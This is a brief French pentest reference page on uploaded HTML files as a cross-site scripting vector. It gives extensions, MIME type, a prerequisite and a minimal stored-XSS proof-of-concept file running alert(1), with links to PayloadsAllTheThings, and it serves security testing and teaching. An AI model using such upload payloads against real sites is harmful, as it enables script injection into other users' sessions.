# HTML

![](logo_html5.png)

**Facteur de risque** : XSS

**Extension** : `.html`, `.htm`

**Type MIME** : `text/html`

**Description** : Le **H**yper**T**ext **M**arkup **L**anguage (**HTML** ou **HTML5**) est un langage de balisage conçu pour représenter les pages web.

## Sommaire

- Cross-site scripting (XSS)

## Cross-site scripting (XSS)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Le code HTML suivant fait apparaître un pop up :

**xss.html**, **xss.htm**

```html
<!DOCTYPE html>
<html>
<body>

<h1>Stored XSS</h1>

<script>alert(1)</script>

</body>
</html>
```

## References

[PayloadsAllTheThings/xss.htm at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/xss.htm)

[PayloadsAllTheThings/xss.html at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20HTML/xss.html)

## Todo
